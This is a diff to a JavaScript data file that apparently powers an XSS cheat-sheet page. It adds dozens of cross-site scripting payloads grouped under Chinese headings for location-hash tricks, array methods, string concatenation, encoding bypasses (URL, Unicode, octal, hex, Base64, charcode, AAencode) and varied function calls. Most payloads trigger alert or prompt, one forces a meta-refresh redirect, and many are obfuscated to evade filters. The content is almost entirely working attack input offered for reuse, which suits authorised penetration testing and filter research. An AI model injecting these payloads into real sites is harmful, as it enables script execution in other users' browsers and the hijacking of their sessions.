@@ -625,14 +625,99 @@ getData([
 						"card-item-content-h4": [{
 							"content-h4": [
 								"'\"><h1>test</h1>",
-								"'\"><hr />",
-								"'\"><img src=x onerror=x>",
 								"'\"><img src=x onerror=alert(6)>",
+								"'\"><body/onfocus=\"a=prompt,a`1`\">",
+								"'\"><video src=1 onerror=alert(1)>",
+								"'\"><audio src=x onerror=alert(1)>",
+								"'\"><button onfocus=alert(1) autofocus>",
+								"'\"><svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26></animate>"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"需要与用户交互"
+							]
+						}]
+					}
+					
+				]
+			},
+			{
+				"card-item-header": "Location",
+				"card-item-body": [{
+						"card-item-h4": "",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><body/onload=eval(location.hash.slice(1))>#alert(1)",
+								"'\"><body/onload=setTimeout(location.hash.substr(1))()>#alert(1)",
+								"'\"><body/onload=Set.constructor(location.hash.substr(1))()>#alert(1)",
+								"'\"><body/onload=execScript(location.hash.substr(1))>#alert(1)",
+								"'\"><body/onload=Function(location.hash.slice(1))()>#alert(1)"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								""
+							]
+						}]
+					}
+					
+				]
+			},
+			{
+				"card-item-header": "数组利用",
+				"card-item-body": [{
+						"card-item-h4": "",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><a href=\"javascript:[''].find(alert`1`)\">XSS Test</a>",
+								"'\"><a href=\"javascript:[''].findIndex(alert(1)\">XSS Test</a>",
+								"'\"><a href=\"javascript:[''].filter(alert)\">XSS Test</a>",
+								"'\"><a href=\"javascript:[''].forEach(alert)\">XSS Test</a>",
+								"'\"><a href=\"javascript:(new Map()).set(1,'').forEach(alert)\">XSS Test</a>",
+								"'\"><a href=\"javascript:(new Set([''])).forEach(alert)\">XSS Test</a>",
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								""
+							]
+						}]
+					}
+					
+				]
+			},
+			{
+				"card-item-header": "赋值拼接",
+				"card-item-body": [{
+						"card-item-h4": "",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><img src=1 onerror=window.alert(1)>",
+								"'\"><iframe onload=location=['javasc','ript:al','ert(1)'].join('')>",
+								"'\"><iframe onload=location=javascri'.concat('pt:aler','t(1)')>",
+								"'\"><img src=x onerror=_=alert;x=1;_(1)>",
 								"'\"><brute contenteditable onblur=alert(1)>lose focus!",
 								"'\"><svg><script xlink:href=data:,alert(1)></script>",
-								"'\"><svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26></animate>",
 								"'\"><details open ontoggle=top[8680439..toString(30)](1); >",
-								"'\"><meta name=\"language\" content=\"0;http://www.baidu.com\"HTTP-EQUIV=\"refresh\"\" />"
+								"'\"><details open ontoggle=top['prompt'](1)>",
+								"'\"><meta name=\"language\" content=\"0;http://www.baidu.com\"HTTP-EQUIV=\"refresh\"\" />",
+								"'\"><body/onfocus=top.alert(1)>",
+								"'\"><body onpageshow=top['confir'%2b'm'](1)>",
+								"'\"><audio src/onerror=self['pro'+'mpt'](1)>",
+								"'\"><details ontoggle=this['ale'+'rt']`1` open>",
+								"'\"><marquee onstart=top.eval('ale'%2B'rt(1)')>",
+								"'\"><img/src=1 onerror=window.alert(1)>",
+								"'\"><svg onload=\"a(this);function a(){}(alert`1`)\">",
 							],
 							"annotation": [
 								"",
@@ -643,7 +728,15 @@ getData([
 								"",
 								"",
 								"",
-								"跳转"
+								"重定向",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								""
+								
 							]
 						}]
 					}
@@ -652,11 +745,100 @@ getData([
 			},
 			{
 				"card-item-header": "编码绕过",
-				"card-item-body": [{
+				"card-item-body": [
+					{
+						"card-item-h4": "URL编码",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><img src=\"x\" onerror=\"eval(unescape('%61%6c%65%72%74%28%31%29'))\">",
+								"'\"><details open ontoggle=eval('%61%6c%65%72%74%28%31%29') >",
+								"'\"><details open ontoggle=%65%76%61%6c(atob('YWxlcnQoMSk=')) >"
+							],
+							"annotation": [
+								"",
+								"",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "Unicode编码",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><a href=\"javascript:al\u0065rt()\">XSS Test</a>",
+								"'\"><a href=\"javascript:al\\u{65}rt()\">XSS Test</a>",
+								"'\"><svg/onload=\u0073etInterval('\\141\\154\\145\\162\\164\\50\\61\\51')>",
+								"'\"><svg/onload=setTimeout`prompt\u00281\u0029`>"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "JS8",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><body onpageshow=content['\\141\\154\\145\\162\\164'](1)>",
+								"'\"><svg/onload=setTimeout('\\141\\154\\145\\162\\164\\50\\61\\51')>"
+							],
+							"annotation": [
+								"",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "JS16",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><body onpageshow=frames['\\x61\\x6c\\x65\\x72\\x74'](1)>",
+								"'\"><svg/onload=Set.constructor`al\\x65rt\\x281\\x29```>",
+								"'\"><svg/onload=Map.constructor`al\\x65rt\\x281\\x29```>",
+								"'\"><svg/onload=clear.constructor`al\\x65rt\\x281\\x29```>",
+								"'\"><svg/onload=Array.constructor`al\\x65rt\\x281\\x29```>",
+								"'\"><svg/onload=WeakSet.constructor`al\\x65rt\\x281\\x29```>"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "Base64",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><details open ontoggle=eval(atob('YWxlcnQoMSk='))>"
+							],
+							"annotation": [
+								""
+							]
+						}]
+					},
+					{
+						"card-item-h4": "ASCII",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"><img/src=1 onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">"
+							],
+							"annotation": [
+								""
+							]
+						}]
+					},
+					{
 						"card-item-h4": "AAencode",
 						"card-item-content-h4": [{
 							"content-h4": [
-								"'\"><img src=x onerror=\"ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ ['_']; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)],ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\'';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+/*´∇｀*/(ﾟДﾟ)[ﾟoﾟ]+						(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) +						(ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+((o^_^o)						- (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) +						(ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) +	(ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ))('_');\">"
+								"'\"><img src=x onerror=\"ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\'';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+/*´∇｀*/(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((o^_^o) +(o^_^o))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');\">"
 							],
 							"annotation": [
 								"http://www.atoolbox.net/Tool.php?Id=703"
@@ -696,6 +878,48 @@ getData([
 							]
 						}]
 					}
+				]
+			},
+			{
+				"card-item-header": "函数多样调用",
+				"card-item-body": [{
+						"card-item-h4": "",
+						"card-item-content-h4": [{
+							"content-h4": [
+								"'\"<a href=\"javascript:alert.call(null,'param')\">XSS Test</a>",
+								"'\"<a href=\"javascript:alert.apply(null,['param'])\">XSS Test</a>",
+								"'\"<a href=\"javascript:alert.bind()('param')\">XSS Test</a>",
+								"'\"<a href=\"javascript:Reflect.apply(alert,null,['param'])\">XSS Test</a>",
+								"'\"<a href=\"javascript:setTimeout`alert\\x28\\x29`\">XSS Test</a>",
+								"'\"<a href=\"javascript:eval(atob())\">XSS Test</a>",
+								"'\"<a href=\"javascript:eval(String.fromCharCode(97,108,))\">XSS Test</a>",
+								"'\"<img src=1 onerror=(function(){alert(1)})()>",
+								"'\"<img src=1 onerror=!function(){alert(1)}()>",
+								"'\"<img src=1 onerror=%2bfunction(){alert(1)}()>",
+								"'\"<img src=1 onerror=%2dfunction(){alert(1)}()>",
+								"'\"<img src=1 onerror=~function(){alert(1)}()>",
+								"'\"<a href=\"javascript:(alert)()\">XSS Test</a>",
+								"'\"<a href=\"javascript:`${alert(1)}`\">XSS Test</a>"
+							],
+							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								""
+							]
+						}]
+					}
+					
 				]
 			}
 		]
